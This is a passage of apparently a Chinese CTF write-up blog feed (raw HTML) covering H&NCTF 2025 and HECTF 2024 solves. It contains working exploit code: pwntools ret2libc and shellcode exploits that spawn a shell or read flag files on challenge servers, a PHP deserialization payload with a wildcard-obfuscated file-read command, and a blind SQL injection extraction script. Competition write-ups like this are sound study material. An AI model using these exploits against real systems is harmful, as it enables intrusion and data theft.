class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">    new_table = <span class="built_in">list</span>(table)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">59</span>):</span><br><span class="line">        j = i + k</span><br><span class="line">        <span class="keyword">if</span> j &lt; <span class="built_in">len</span>(new_table):</span><br><span class="line">            new_table[i], new_table[j] = new_table[j], new_table[i]</span><br><span class="line">    new_table = <span class="string">&#x27;&#x27;</span>.join(new_table)</span><br><span class="line">    btl = <span class="built_in">str</span>.maketrans(new_table,table)</span><br><span class="line">    flag = base64.b64decode(ans_b64.translate(btl))</span><br><span class="line">    <span class="keyword">if</span> flag.startswith(<span class="string">b&#x27;H&amp;NCTF&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(k,new_table)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;H&amp;NCTF&#123;Ye5h!!!I_Lik333_bur9~^o^&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p><code>H&amp;NCTF&#123;Ye5h!!!I_Lik333_bur9~^o^&#125;</code></p><p>​    </p><h3 id="签到re"><a href="#签到re" class="headerlink" title="签到re"></a>签到re</h3><blockquote><p>很简单的加密，一梭就出来了</p></blockquote><p>代码逻辑：</p><p>key的sha256的前四字节作为key，明文每4字节做矩阵乘法。还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">key = [<span class="number">81</span>, <span class="number">22</span>, <span class="number">52</span>, <span class="number">251</span>]  <span class="comment"># k0, k1, k2, k3</span></span><br><span class="line">cipher_bytes = [</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x25</span>, <span class="number">0x0C</span>, <span class="number">0xE2</span>, <span class="number">0x70</span>, <span class="number">0x89</span>, <span class="number">0x98</span>, <span class="number">0xB2</span>, </span><br><span class="line">    <span class="number">0xBB</span>, <span class="number">0xE4</span>, <span class="number">0x94</span>, <span class="number">0xA0</span>, <span class="number">0x95</span>, <span class="number">0xAC</span>, <span class="number">0x38</span>, <span class="number">0x92</span>, <span class="number">0x22</span>, <span class="number">0xF8</span>, </span><br><span class="line">    <span class="number">0x0E</span>, <span class="number">0x7B</span>, <span class="number">0x76</span>, <span class="number">0x1A</span>, <span class="number">0x66</span>, <span class="number">0xC8</span>, <span class="number">0x03</span>, <span class="number">0x05</span>, <span class="number">0x2E</span>, <span class="number">0x7D</span>, </span><br><span class="line">    <span class="number">0xA1</span>, <span class="number">0x04</span>, <span class="number">0x3D</span>, <span class="number">0xC0</span>, <span class="number">0x62</span>, <span class="number">0xFE</span>, <span class="number">0x66</span>, <span class="number">0x67</span>, <span class="number">0x02</span>, <span class="number">0x87</span>, </span><br><span class="line">    <span class="number">0x81</span>, <span class="number">0xF4</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">orig_len = (cipher_bytes[<span class="number">0</span>] &lt;&lt; <span class="number">24</span>) | (cipher_bytes[<span class="number">1</span>] &lt;&lt; <span class="number">16</span>) | (cipher_bytes[<span class="number">2</span>] &lt;&lt; <span class="number">8</span>) | cipher_bytes[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">mod = <span class="number">256</span></span><br><span class="line">k0, k1, k2, k3 = key</span><br><span class="line">det = (k0 * k3 - k1 * k2) % mod</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> a, <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    g, x1, y1 = egcd(b, a % b)</span><br><span class="line">    <span class="keyword">return</span> g, y1, x1 - (a // b) * y1</span><br><span class="line"></span><br><span class="line">g, x, y = egcd(det, mod)</span><br><span class="line">inv_det = x % mod</span><br><span class="line"></span><br><span class="line">inv_mat = np.array([</span><br><span class="line">    [( inv_det * k3) % mod, (-inv_det * k1) % mod],</span><br><span class="line">    [(-inv_det * k2) % mod, ( inv_det * k0) % mod]</span><br><span class="line">], dtype=<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">payload = cipher_bytes[<span class="number">4</span>:]</span><br><span class="line">plaintext = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(payload), <span class="number">4</span>):</span><br><span class="line">    block = payload[i:i+<span class="number">4</span>]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> (<span class="number">0</span>, <span class="number">2</span>):</span><br><span class="line">        c = np.array([block[j], block[j+<span class="number">1</span>]], dtype=<span class="built_in">int</span>)</span><br><span class="line">        p = inv_mat.dot(c) % mod</span><br><span class="line">        plaintext.extend(p.tolist())</span><br><span class="line"></span><br><span class="line">plaintext = plaintext[:orig_len]</span><br><span class="line">plain_bytes = <span class="built_in">bytes</span>(plaintext)</span><br><span class="line"><span class="built_in">print</span>(plain_bytes)</span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;H&amp;NCTF&#123;840584fb08a26f01c471054628e451&#x27;</span></span><br></pre></td></tr></table></figure><p><code>H&amp;NCTF&#123;840584fb08a26f01c471054628e451&#125;</code></p><p>​    </p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="pdd助力"><a href="#pdd助力" class="headerlink" title="pdd助力"></a>pdd助力</h3><blockquote><p>pdd说你是最幸运的人</p></blockquote><p>随机数用ctypes.cdll模拟，最后是一个ret2libc。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;27.25.151.198&#x27;</span>,<span class="number">47827</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn2/pwn2&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./pwn2/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_r = cdll.LoadLibrary(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">libc_r.srand(libc_r.time(<span class="number">0</span>))</span><br><span class="line">v5 = libc_r.rand()</span><br><span class="line">libc_r.srand(v5 % <span class="number">5</span> - <span class="number">44174237</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">55</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;good!\n&#x27;</span>)</span><br><span class="line">    x = libc_r.rand() % <span class="number">4</span> + <span class="number">1</span></span><br><span class="line">    r.sendline(<span class="built_in">str</span>(x).encode())</span><br><span class="line"></span><br><span class="line">libc_r.srand(<span class="number">8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">55</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;good!\n&#x27;</span>)</span><br><span class="line">    x = libc_r.rand() % <span class="number">4</span> + <span class="number">8</span></span><br><span class="line">    r.sendline(<span class="built_in">str</span>(x).encode())</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;man.\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt.puts</span><br><span class="line">puts_got=elf.got.puts</span><br><span class="line">pop_rdi=<span class="number">0x401483</span></span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line">func=elf.sym.func</span><br><span class="line">pl=flat([<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>+<span class="number">8</span>),pop_rdi,puts_got,puts_plt,func])</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">puts_addr=u64(r.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line">info(<span class="string">f&#x27;<span class="subst">&#123;puts_addr:x&#125;</span>&#x27;</span>)</span><br><span class="line">libc.address=puts_addr-libc.sym.puts</span><br><span class="line"></span><br><span class="line">system=libc.sym.system</span><br><span class="line">binsh=<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;man.\n&#x27;</span>)</span><br><span class="line">pl=flat([<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>+<span class="number">8</span>),ret,pop_rdi,binsh,system,func])</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p>seccomp-tools查sandbox，只有OR没有W，侧信道爆破方式攻击：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">r=<span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">i, c</span>):</span><br><span class="line">    <span class="keyword">global</span> r</span><br><span class="line">    r=remote(<span class="string">&#x27;27.25.151.198&#x27;</span>,<span class="number">47499</span>)</span><br><span class="line">    sc=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    movabs rax, 0x67616C66</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    xor rsi, rsi</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    mov rax, 2</span></span><br><span class="line"><span class="string">    syscall #open(&quot;flag.txt&quot;, 0, 0);</span></span><br><span class="line"><span class="string">    mov rsi, rdi</span></span><br><span class="line"><span class="string">    mov rdi, rax</span></span><br><span class="line"><span class="string">    xor rax, rax</span></span><br><span class="line"><span class="string">    mov rdx, 0x100</span></span><br><span class="line"><span class="string">    syscall #read(0, rsp, 0x100);</span></span><br><span class="line"><span class="string">    mov al, [rsp+&#123;&#125;]</span></span><br><span class="line"><span class="string">    cmp al, &#123;&#125;</span></span><br><span class="line"><span class="string">    jbe $</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>.<span class="built_in">format</span>(i, c))</span><br><span class="line"></span><br><span class="line">    r.sendafter(<span class="string">b&quot;command:&quot;</span>, sc)</span><br><span class="line">    r.recv()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r.recv(timeout=<span class="number">3</span>)</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    l = <span class="number">0x20</span></span><br><span class="line">    r = <span class="number">0x80</span></span><br><span class="line">    <span class="keyword">while</span> l &lt;= r:</span><br><span class="line">        m = (l + r) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> find(i, m):</span><br><span class="line">            r = m - <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l = m + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> l==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(l)</span><br><span class="line">    info(<span class="string">&quot;win!!!!!!!!!!!!!!!!!!!!!!!!! &quot;</span>)</span><br><span class="line">    info(flag)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">info(<span class="string">&quot;flag: &quot;</span>+flag)</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="三步走战略"><a href="#三步走战略" class="headerlink" title="三步走战略"></a>三步走战略</h3><blockquote><p>很简单的一个小东西</p></blockquote><p>常规ORW。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;27.25.151.198&#x27;</span>,<span class="number">44392</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;advance.&#x27;</span>)</span><br><span class="line">r.send(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;speak:&#x27;</span>)</span><br><span class="line">sc=shellcraft.<span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line">sc+=shellcraft.read(<span class="number">3</span>, <span class="number">0x1337000</span>+<span class="number">0x200</span>, <span class="number">0x500</span>)</span><br><span class="line">sc+=shellcraft.write(<span class="number">1</span>, <span class="number">0x1337000</span>+<span class="number">0x200</span>, <span class="number">0x500</span>)</span><br><span class="line">pl=asm(sc)</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;say?&#x27;</span>)</span><br><span class="line">pl=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x40</span>+<span class="number">8</span>)+p64(<span class="number">0x1337000</span>)</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="FORENSICS"><a href="#FORENSICS" class="headerlink" title="FORENSICS"></a>FORENSICS</h2><h3 id="ez-game"><a href="#ez-game" class="headerlink" title="ez_game"></a>ez_game</h3><blockquote><p>附件通过网盘下载：<a href="https://pan.baidu.com/s/1Rk1sm5P-_x-6kF7Zy2_4-w?pwd=tbik">https://pan.baidu.com/s/1Rk1sm5P-_x-6kF7Zy2_4-w?pwd=tbik</a> flag用H&amp;NCTF包裹</p></blockquote><p>autopsy分析载入vhd文件分析，在 <code>$RECYCLE.BIN</code> 文件夹下找到zip文件，ARCHPR用rockyou.txt爆破出密码：<code>~!@#$%^&amp;*()_+</code>，解压是一个flag.drawio。</p><p>再在磁盘下找到readme.txt，内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这次是个简单的取证小游戏</span><br><span class="line">1.我藏了一个电脑，它的密码是很简单的弱密码，但是你找的到吗</span><br><span class="line">2.图片没有隐写，但是它凭什么可以成为key，好难猜啊</span><br><span class="line">3.如果你找的了flag，注意flag的内容全部大写</span><br></pre></td></tr></table></figure><p>用 <a href="https://app.diagrams.net/">https://app.diagrams.net/</a> 导入drawio文件，得到flag，换头：</p><p><code>H&amp;NCTF&#123;YOU_R_SSSO_COOL&#125;</code></p><p>​    </p><h2 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h2><h3 id="Chasing-Freedom-2"><a href="#Chasing-Freedom-2" class="headerlink" title="Chasing Freedom 2"></a>Chasing Freedom 2</h3><blockquote><p>Feel to your heart’s content.<br>flag格式: H&amp;NCTF{月份和日期时间(0401)-地点}</p><p>hint1:地点无需添加省、市、县、区</p><p>hint2:结果为某某灯塔</p><p>hint3:日期时间那里不需要()包裹</p><p>hint4:注意错别字和无意间的空格</p></blockquote><p>jpg属性查看，得到拍摄日期：0504。</p><p>百度识图可出是东庠岛灯塔。</p><p><code>H&amp;NCTF&#123;0504-东庠岛灯塔&#125;</code></p><p>​    </p><h3 id="Chasing-Freedom-3"><a href="#Chasing-Freedom-3" class="headerlink" title="Chasing Freedom 3"></a>Chasing Freedom 3</h3><blockquote><p>Feel to your heart’s content.<br>flag格式: H&amp;NCTF{月份和日期时间(0401)-码头-船名}</p><p>hint1:地点无需添加省、市、县、区</p><p>hint2:flag格式修正</p><p>hint3:日期时间那里不需要()包裹</p><p>hint4:注意错别字和无意间的空格</p></blockquote><p>jpg属性查看，得到拍摄日期：0504。</p><p>百度识图可出是平潭岛码头，图里有船名不完整名称，搜索可出。</p><p><code>H&amp;NCTF&#123;0504-流水码头-岚庠渡3号&#125;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;竞赛时间：5月24日8:00—5月25日12:00（共28小时）&lt;/p&gt;
&lt;p&gt;竞赛题型：涵盖 Web、Reverse、Pwn、Crypto、Misc 等主流赛题方向&lt;/p&gt;
&lt;p&gt;奖项设置：前20名获奖，设一、二、三等奖及优胜奖，颁发荣誉证书及赞</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2025赛" scheme="https://lazzzaro.github.io/tags/2025%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>2024 HECTF</title>
    <link href="https://lazzzaro.github.io/2024/12/08/match-2024-HECTF/"/>
    <id>https://lazzzaro.github.io/2024/12/08/match-2024-HECTF/</id>
    <published>2024-12-08T12:43:35.000Z</published>
    <updated>2024-12-09T13:01:30.205Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>河北师范大学信息安全挑战赛是由河北师范大学SourceCode战队组织的面向全国大学生的CTF竞技活动。自HECTF举办至今，每届大赛都会吸引来自全国400多支队伍和校内大量的学生报名参加比赛。 2024HECTF挑战赛是我们举办的第八届赛事，由河北师范大学SourceCode战队发起，河北师范大学计算机与网络空间安全学院主办，河北省网络与信息安全重点实验室和河北师范大学信息安全协会承办，杭州凌武科技有限公司提供竞赛平台及技术支持，是面向全国大学生的一次竞技活动。</p><p>竞赛时间： 2024年12月7日09:00-2024年12月8日21:00</p><p>题目类别： 线上CTF-JEO（解题）赛制。赛题包括但不限于 Pwn， Reverse ，Crypto ，Web 和 Misc等。</p><p><strong>Rank: 3</strong></p><hr><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="baby-unserialize"><a href="#baby-unserialize" class="headerlink" title="baby_unserialize"></a>baby_unserialize</h3><blockquote><p>一个简单的反序列化，一个简单的RCE</p></blockquote><p>构造pop链，RCE部分用通配符绕过：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">class02</span>:</span><br><span class="line">    public_payload=<span class="string">&#x27;/bin/ca[s-u] /fla[f-h]||1&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">class00</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">class01</span>:</span><br><span class="line">    public_cls=class00()</span><br><span class="line">    public_str3=class02()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    public_msg=class01()</span><br><span class="line">    public_token=<span class="string">&#x27;admin&#x27;</span></span><br><span class="line"></span><br><span class="line">s = serialize(User()).replace(<span class="string">&#x27;O:4:&quot;User&quot;:2&#x27;</span>,<span class="string">&#x27;O:4:&quot;User&quot;:3&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"><span class="built_in">print</span>(b64encode(s.encode()).decode())</span><br></pre></td></tr></table></figure><p>POST:</p><p><code>user=Tzo0OiJVc2VyIjozOntzOjM6Im1zZyI7Tzo3OiJjbGFzczAxIjoyOntzOjM6ImNscyI7Tzo3OiJjbGFzczAwIjowOnt9czo0OiJzdHIzIjtPOjc6ImNsYXNzMDIiOjE6e3M6NzoicGF5bG9hZCI7czoyNToiL2Jpbi9jYVtzLXVdIC9mbGFbZi1oXXx8MSI7fX1zOjU6InRva2VuIjtzOjU6ImFkbWluIjt9</code></p><p>得到flag。</p><p>​    </p><h3 id="Are-u-happy"><a href="#Are-u-happy" class="headerlink" title="Are u happy"></a>Are u happy</h3><blockquote><p>开始开心地玩耍吧！</p></blockquote><p>查看源代码有提示：<code>&lt;!--hint:base64--&gt;</code>，在网页资源的 <code>api/js/game.js</code> 中，搜索 <code>HECTF&#123;</code> 对应的base64编码开头 <code>SEVD</code>，找到：</p><p><code>&#39;SEVDVEZ7aU9CbVZmVE1Nc3lvaXJWZ2dXSHk5eUVBNHRIQXlCZWtjQzVOMTNpYX0=&#39;;</code></p><p>解码得flag：<code>HECTF&#123;iOBmVfTMMsyoirVggWHy9yEA4tHAyBekcC5N13ia&#125;</code>。</p><p>​    </p><h3 id="baby-sql"><a href="#baby-sql" class="headerlink" title="baby_sql"></a>baby_sql</h3><blockquote><p>g01den的公司里有个记录员工打卡的后台，只有admin才能登陆，但是，g01den发现，每次去公司视察的时候公司里的员工总数始终和打卡了的员工数目对不上，g01den怀疑公司里的某位员工利用了漏洞，于是他在后台程序里增加了一些WAF，并且他对他自己的WAF很自信，并暗示了那位员工他在数据库里放了一个重要的信息（flag），能拿到这个信息（flag）的人年终可以获得额外的奖金。作为那位员工的你应该如何拿到这个信息获得奖金呢？</p><p>flag由HECTF开头，得到的答案请将hectf修改为大写HECTF，flag中除了开头的HECTF外，无大写字母</p></blockquote><p>测试注入点：<code>`name=admin&amp;pw=admin&#39;||(1)||&#39;0</code>。</p><p>布尔盲注，从数据库开始找起：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://8.153.103.216:31934/&#x27;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;if(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27;</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&quot;flag1shere&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27;</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&quot;lookhere&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27;</span></span><br><span class="line">        payload = <span class="string">f&#x27;if(ascii(substr((select(group_concat(flag))from(flag1shere.lookhere)),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)&#x27;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;pw&#x27;</span>: <span class="string">f&quot;admin&#x27;||(<span class="subst">&#123;payload&#125;</span>)||&#x27;0&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;fc2ce1340d3eaa16d68dbfb35d3aaac6&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span 